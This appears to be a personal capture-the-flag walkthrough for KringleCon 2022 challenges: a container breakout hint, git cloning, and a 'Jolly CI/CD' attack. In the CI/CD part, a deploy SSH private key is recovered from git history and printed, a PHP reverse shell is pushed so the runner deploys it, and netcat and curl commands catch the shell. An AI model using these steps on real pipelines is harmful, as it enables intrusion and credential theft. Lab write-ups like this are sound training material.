# Clone with a purpose

![Pasted image 20221208194235](https://user-images.githubusercontent.com/50979196/209268639-cfbfa8e6-fe77-4c24-b277-78b449d24b49.png)



```
git clone https://haugfactory.com/asnowball/aws_scripts.git

```

![Pasted image 20221208194711](https://user-images.githubusercontent.com/50979196/209268789-29ab886d-0c91-4d81-920c-a23ad8c9e45b.png)

# Prison escape
Hint from
https://learn.snyk.io/lessons/container-runs-in-privileged-mode/kubernetes/

![Pasted image 20221208190025](https://user-images.githubusercontent.com/50979196/209268820-12ac80e0-49d8-42b6-a69b-035519137082.png)



![[Pasted image 20221210130327.png]]
![Pasted image 20221208192822](https://user-images.githubusercontent.com/50979196/209268882-416454ed-df4a-4b4c-8973-2d64d863ac5c.png)

```

082bb339ec19de4935867 
```

```
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation

Section Mounting Disk - Poc1 
```

# Jolly CI/CD
![Pasted image 20221210132309](https://user-images.githubusercontent.com/50979196/209268914-d55c2993-e461-48f9-8551-29ac6043d6ce.png)


hint 1 
Switching Hats
_From: Tinsel Upatree
Terminal: Jolly CI/CD
If you find a way to impersonate another identity, you might try re-cloning a repo with their credentials.

hint2 
Commiting to Mistakes
_From: Tinsel Upatree
Terminal: Jolly CI/CD
The thing about Git is that every step of development is accessible – even steps you didn't mean to take! `git log` can show code skeletons.

![Pasted image 20221210131432](https://user-images.githubusercontent.com/50979196/209268968-05e65dfb-d808-4281-a05d-cd31bfc3086a.png)

```
sudo git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
```
![Pasted image 20221216103854](https://user-images.githubusercontent.com/50979196/209268994-4b9f4288-4d87-496c-9086-045fac92be68.png)

url from the elf outside
![Pasted image 20221210140021](https://user-images.githubusercontent.com/50979196/209269020-53b8afde-0826-45b4-a630-3ce9a554e558.png)


im thinking the hint may refer to doing a sudo git clone
then doing a git checkout of any mistakes 'whoops'

```
commit e2208e4bae4d41d939ef21885f13ea8286b24f05
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:43:53 2022 -0700

    big update

commit e19f653bde9ea3de6af21a587e41e7a909db1ca5
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:42:54 2022 -0700

    whoops
```

mistake made in added assets and fixed in whoops
```
commit abdea0ebb21b156c01f7533cea3b895c26198c98
Author: knee-oh <sporx@kringlecon.com>
Date:   Tue Oct 25 13:42:13 2022 -0700

    added assets
```

![Pasted image 20221210153628](https://user-images.githubusercontent.com/50979196/209269155-68109f5b-d3fb-4b0e-ae9e-4d39c754d2aa.png)


```
sudo git checkout abdea0ebb21b156c01f7533cea3b895c26198c98
```

go to directory with .ssh/.deploy

from here, copy ssh key, run a clone with it

```
git clone ssh://git@gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
```

private key
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
-----END OPENSSH PRIVATE KEY-----
```

Looking at this there is a file that shows a runner will update the site with anything i push to main. i can upload a php shell to the repo and the runner will add it to the site 
php shell
```
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```


```
git add 'shell.php'
git commit -m 'say something'
git push ssh://git@gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git main
```

```
type ``` screen``` to create another screen
ctrl+a CTRL+c (now have 2 screens to alternate)
nc -nvlp 1234
ctrl + a (twice?) to move back a screen
```
```
curl http://wordpress.flag.net.internal/shell.php
```


![Pasted image 20221216093650](https://user-images.githubusercontent.com/50979196/209269264-2e211c08-41db-40bf-b875-97f837e881c3.png)

![Pasted image 20221216093741](https://user-images.githubusercontent.com/50979196/209269285-1d7f0d34-9ec8-4f3e-98a0-c178e4f6d8c9.png)



oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT
